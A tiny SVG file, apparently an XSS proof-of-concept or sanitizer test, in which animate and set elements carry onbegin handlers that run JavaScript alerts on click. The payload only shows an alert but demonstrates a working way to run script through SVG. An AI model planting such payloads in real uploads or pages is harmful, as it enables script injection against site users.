<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red">
    <animate attributeName="x" from="0" to="100" dur="0.1s" begin="click" onbegin="javascript:alert('Advanced XSS via animate')" />
    <set attributeName="fill" to="blue" begin="click" onbegin="javascript:alert('Advanced XSS via set')" />
  </rect>
</svg>
